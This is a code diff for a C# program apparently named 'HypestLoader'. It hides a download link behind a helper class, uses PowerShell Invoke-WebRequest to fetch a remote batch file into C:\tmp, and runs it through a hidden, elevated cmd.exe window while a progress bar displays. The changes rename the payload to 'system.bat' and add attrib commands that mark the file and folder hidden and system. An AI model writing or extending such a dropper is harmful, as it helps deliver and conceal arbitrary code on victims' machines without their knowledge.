@@ -27,7 +27,7 @@ namespace HypestLoader
         static void DownloadFile()
         {
             string link = HideLink.getLink();
-            string command = $"Powershell Invoke-WebRequest {link} -OutFile C:/tmp/learix.bat";
+            string command = $"Powershell Invoke-WebRequest {link} -OutFile C:/tmp/system.bat";
             PowerShellHandling.RunScript(command);
 
 
@@ -36,16 +36,21 @@ namespace HypestLoader
         static void CreatFolder(string folderName)
         {
             DirectoryInfo diretorio = Directory.CreateDirectory(@"C:\tmp");
-            diretorio.Attributes = FileAttributes.Hidden;
+            
         }
 
         static void StartBat()
         {
-            string program = "start learix.bat";
+            string program = "start system.bat ";
+            string hideFolder = "attrib +h +s C:\\tmp";
+            string hideFile = "attrib +r +h +s system.bat";
+
+
+
+
             Process cmd = new Process();
             cmd.StartInfo.FileName = "cmd.exe";
             cmd.StartInfo.RedirectStandardInput = true;
-            cmd.StartInfo.RedirectStandardOutput = true; // Não preciso
             cmd.StartInfo.CreateNoWindow = true;
             cmd.StartInfo.UseShellExecute = false;
             cmd.StartInfo.Verb = "runas";
@@ -54,10 +59,13 @@ namespace HypestLoader
             try
             {
                 cmd.StandardInput.WriteLine("cd " + @"C:\tmp\");
+                cmd.StandardInput.WriteLine(hideFile);
+                cmd.StandardInput.WriteLine(hideFolder);
                 cmd.StandardInput.WriteLine(program);
                 cmd.StandardInput.Flush();
                 cmd.StandardInput.Close();
                 Task.Delay(1000);
+                
                 Application.Exit();
             }
             catch (Exception e)
@@ -82,11 +90,10 @@ namespace HypestLoader
             if (progressBar1.Value == progressBar1.Maximum)
             {
                 timer1.Enabled = false;
-                string fileFolder = @"C:\tmp\learix.bat";
-                FileInfo file = new FileInfo(@"C:\tmp\learix.bat");
+                string fileFolder = @"C:\tmp\system.bat";
+                FileInfo file = new FileInfo(@"C:\tmp\system.bat");
                 if (File.Exists(fileFolder))
                 {
-                    file.Attributes = FileAttributes.Hidden;
                     StartBat();
                 }
                 else
